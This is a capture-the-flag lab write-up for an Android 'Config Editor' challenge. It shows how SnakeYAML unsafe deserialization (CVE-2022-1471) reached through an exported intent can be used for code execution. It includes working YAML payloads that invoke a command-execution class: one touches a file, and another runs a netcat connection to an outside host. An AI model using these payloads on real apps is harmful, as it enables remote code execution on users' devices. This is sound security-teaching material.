The Challenge: https://www.mobilehackinglab.com/course/lab-config-editor-rce

# Download the APK 
`$ adb connect 10.11.1.1:5001`
`$ adb shell pm list packages |grep config`
```
package:com.android.carrierconfig
package:com.android.emulator.radio.config
package:com.mobilehackinglab.configeditor
```
`$ adb shell pm path com.mobilehackinglab.configeditor`
`$ $ adb pull /data/app/~~7nJyEbpomszhvZKacYpBDQ==/com.mobilehackinglab.configeditor-Xlgn336TGw-b6-q5Xmjmyg==/base.apk`

# Static Analysis
## Decompile
`$ apktool d base.apk`
```
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.7.0-dirty on base.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Baksmaling classes2.dex...
I: Baksmaling classes4.dex...
I: Baksmaling classes3.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory
```

**Looking for something that related to Yaml information**
`$ find . -name "*yaml*"`
```
./base/smali/org/yaml
./base/smali/org/yaml/snakeyaml
```

## OSINT
**SnakeYML Exploit, references:**
- https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/
- https://security.netapp.com/advisory/ntap-20230818-0015/
- https://github.com/google/security-research/security/advisories/GHSA-mjmj-j48q-9wg2
- https://github.com/1fabunicorn/SnakeYAML-CVE-2022-1471-POC
- https://www.mscharhag.com/security/snakeyaml-vulnerability-cve-2022-1471

## Code Analysis
**Interesting config of intent-filter in AndroidManifest.xml:**
```xml
        <activity android:name="com.mobilehackinglab.configeditor.MainActivity" android:exported="true">  
            <intent-filter>  
                <action android:name="android.intent.action.MAIN"/>  
                <category android:name="android.intent.category.LAUNCHER"/>  
            </intent-filter>  
            <intent-filter>  
                <action android:name="android.intent.action.VIEW"/>  
                <category android:name="android.intent.category.DEFAULT"/>  
                <category android:name="android.intent.category.BROWSABLE"/>  
                <data android:scheme="file"/>  
                <data android:scheme="http"/>  
                <data android:scheme="https"/>  
                <data android:mimeType="application/yaml"/>  
            </intent-filter>  
        </activity>
```

Try to direct call an intent
`$ adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d "http://google.com"`
```bash
Starting: Intent { act=android.intent.action.VIEW dat=http://google.com/... cmp=com.mobilehackinglab.configeditor/.MainActivity }
Error type 3
Error: Activity class {com.mobilehackinglab.configeditor/com.mobilehackinglab.configeditor.MainActivity} does not exist.
```

**Looking for the MainActivity, there's a method called as handleIntent()**
```kotlin
    private final void handleIntent() {  
        Intent intent = getIntent();  
        String action = intent.getAction();  
        Uri data = intent.getData();  
        if (Intrinsics.areEqual("android.intent.action.VIEW", action) && data != null) {  
            CopyUtil.Companion.copyFileFromUri(data).observe(this, new MainActivity$sam$androidx_lifecycle_Observer$0(new Function1<Uri, Unit>() { // from class: com.mobilehackinglab.configeditor.MainActivity$handleIntent$1  
                /* JADX INFO: Access modifiers changed from: package-private */  
                {  
                    super(1);  
                }  
  
                @Override // kotlin.jvm.functions.Function1  
                public /* bridge */ /* synthetic */ Unit invoke(Uri uri) {  
                    invoke2(uri);  
                    return Unit.INSTANCE;  
                }  
  
                /* renamed from: invoke  reason: avoid collision after fix types in other method */  
                public final void invoke2(Uri uri) {  
                    MainActivity mainActivity = MainActivity.this;  
                    Intrinsics.checkNotNull(uri);  
                    mainActivity.loadYaml(uri);  
                }  
            }));  
        }  
    }
```

From that script, we can said that "**the app tries to get any data from the link then call the method loadYaml()**".
```kotlin
    public final void loadYaml(Uri uri) {  
        try {  
            ParcelFileDescriptor openFileDescriptor = getContentResolver().openFileDescriptor(uri, "r");  
            ParcelFileDescriptor parcelFileDescriptor = openFileDescriptor;  
            FileInputStream inputStream = new FileInputStream(parcelFileDescriptor != null ? parcelFileDescriptor.getFileDescriptor() : null);  
            DumperOptions $this$loadYaml_u24lambda_u249_u24lambda_u248 = new DumperOptions();  
            $this$loadYaml_u24lambda_u249_u24lambda_u248.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);  
            $this$loadYaml_u24lambda_u249_u24lambda_u248.setIndent(2);  
            $this$loadYaml_u24lambda_u249_u24lambda_u248.setPrettyFlow(true);  
            Yaml yaml = new Yaml($this$loadYaml_u24lambda_u249_u24lambda_u248);  
            Object deserializedData = yaml.load(inputStream);  
            String serializedData = yaml.dump(deserializedData);  
            ActivityMainBinding activityMainBinding = this.binding;  
            if (activityMainBinding == null) {  
                Intrinsics.throwUninitializedPropertyAccessException("binding");  
                activityMainBinding = null;  
            }  
            activityMainBinding.contentArea.setText(serializedData);  
            Unit unit = Unit.INSTANCE;  
            CloseableKt.closeFinally(openFileDescriptor, null);  
        } catch (Exception e) {  
            Log.e(TAG, "Error loading YAML: " + uri, e);  
        }  
    }
```

In the **loadYaml()** the method call **DumperOptions** which is it belong to **snakeyaml**.
```
import org.yaml.snakeyaml.DumperOptions;  
import org.yaml.snakeyaml.Yaml;
```

# Pre-Exploitation

	SnakeYAML allows users to create classes, pass constructor parameters and call setters from a provided YAML file.

In the apk itself, we also have the class LegacyCommandUtil
```kotlin
package com.mobilehackinglab.configeditor;  
  
import androidx.constraintlayout.widget.ConstraintLayout;  
import kotlin.Deprecated;  
import kotlin.DeprecationLevel;  
import kotlin.Metadata;  
import kotlin.jvm.internal.Intrinsics;  
  
/* compiled from: LegacyCommandUtil.kt */  
@Deprecated(level = DeprecationLevel.ERROR, message = "Command Util is unsafe and should not be used")  
@Metadata(d1 = {"\u0000\u0012\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0002\b\u0007\u0018\u00002\u00020\u0001B\r\u0012\u0006\u0010\u0002\u001a\u00020\u0003¢\u0006\u0002\u0010\u0004¨\u0006\u0005"}, d2 = {"Lcom/mobilehackinglab/configeditor/LegacyCommandUtil;", "", "command", "", "(Ljava/lang/String;)V", "app_debug"}, k = 1, mv = {1, 9, 0}, xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)  
/* loaded from: classes4.dex */  
public final class LegacyCommandUtil {  
    public LegacyCommandUtil(String command) {  
        Intrinsics.checkNotNullParameter(command, "command");  
        Runtime.getRuntime().exec(command);  
    }  
}
```

Then try to abuse the class LegacyCommandUtil to execute a system command through the yml file. Create poc.yml that contains text below:
```
cartcurt: !!com.mobilehackinglab.configeditor.LegacyCommandUtil ["touch /data/data/com.mobilehackinglab.configeditor/poc.txt"]
```

The result:
`$ adb root`
`$ adb shell "ls -al /data/data/com.mobilehackinglab.configeditor/"`
```
total 28
drwx------   5 u0_a111 u0_a111        4096 2024-03-23 17:07 .
drwxrwx--x 144 system  system        12288 2024-01-04 08:15 ..
drwxrws--x   2 u0_a111 u0_a111_cache  4096 2024-01-04 08:15 cache
drwxrws--x   2 u0_a111 u0_a111_cache  4096 2024-01-04 08:15 code_cache
drwxrwx--x   2 u0_a111 u0_a111        4096 2024-01-04 08:25 files
-rw-------   1 u0_a111 u0_a111           0 2024-03-23 17:07 poc.txt                                                        
```

## How to Get RCE?
Just dig something from internet and got this article: https://android.stackexchange.com/questions/133748/is-there-any-netcat-like-application-available-in-android-os-by-default-like-mo, and it said "In recent Androids (e.g. Nougat and later), you don't need to install busybox for running netcat; it is enough to get a terminal and then type: **toybox nc [options]**"


# Exploitation
Create rce.yml that contains text below:
```
exploit: !!com.mobilehackinglab.configeditor.LegacyCommandUtil ["toybox nc 10.11.3.2 9001"]
```
